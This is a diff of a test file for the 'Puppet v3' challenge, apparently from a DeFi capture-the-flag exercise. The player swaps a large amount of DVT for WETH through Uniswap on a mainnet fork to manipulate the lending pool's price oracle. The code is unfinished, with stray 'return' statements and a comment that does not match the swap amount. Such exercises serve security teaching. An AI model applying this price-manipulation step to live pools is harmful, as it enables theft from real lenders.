@@ -6,6 +6,9 @@ const positionManagerJson = require("@uniswap/v3-periphery/artifacts/contracts/N
 const factoryJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Factory.sol/UniswapV3Factory.json");
 const poolJson = require("@uniswap/v3-core/artifacts/contracts/UniswapV3Pool.sol/UniswapV3Pool.json");
 
+const routerJson = require('@uniswap/swap-router-contracts/artifacts/contracts/SwapRouter02.sol/SwapRouter02.json');
+  
+  // deploy the bytecode
 // See https://github.com/Uniswap/v3-periphery/blob/5bcdd9f67f9394f3159dad80d0dd01d37ca08c66/test/shared/encodePriceSqrt.ts
 const bn = require("bignumber.js");
 bn.config({ EXPONENTIAL_AT: 999999, DECIMAL_PLACES: 40 });
@@ -26,7 +29,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = require("./rpc_url.json").RPC_URL;
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -163,6 +166,20 @@ describe('[Challenge] Puppet v3', function () {
         const attackLendingPool = await lendingPool.connect(player);
         const attackToken = await token.connect(player);
 
+        const logBalances = async (name, address) => {
+            const dvt_bal = await attackToken.balanceOf(address);
+            const weth_bal = await weth.balanceOf(address);
+            const eth_bal = await ethers.provider.getBalance(address);
+            log(`Logging balance of ${name}`);
+            log('DVT:', ethers.utils.formatEther(dvt_bal))
+            log('WETH:', ethers.utils.formatEther(weth_bal))
+            log('ETH:', ethers.utils.formatEther(eth_bal))
+        }
+
+        await logBalances("Player", player.address)
+
+        
+
         const attackPuppet = await (await ethers.getContractFactory("AttackPuppetV3", player)).deploy(
             token.address,
             weth.address,
@@ -172,12 +189,35 @@ describe('[Challenge] Puppet v3', function () {
 
         log(attackPuppet.address)
         // await attackPuppet.performSwap();
-        await attackToken.transfer(attackPuppet.address, await attackToken.balanceOf(player.address));
-        console.log(await attackToken.balanceOf(attackPuppet.address));
+        console.log(await attackToken.balanceOf(player.address));
 
 
-        console.log(await attackPool.slot0())
-        // return;
+        // console.log(await attackPool.slot0())
+
+        const uniswapRouter = new ethers.Contract("0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45", routerJson.abi, player);
+        await attackToken.approve(uniswapRouter.address, await attackToken.balanceOf(player.address));
+
+
+        await uniswapRouter.exactInputSingle(
+            [attackToken.address,
+            weth.address,   
+            3000,
+            player.address,
+            110n * 10n ** 18n, // 10 DVT TOKENS
+            0,
+            0],
+            {
+                gasLimit: 1e7
+            }
+        );
+
+        await logBalances("Player", player.address)
+        await logBalances("Pool", attackPool.address)
+
+        return;
+
+        
+        return;
         log(attackPool.address)
         await attackPool.swap(
             attackPuppet.address,
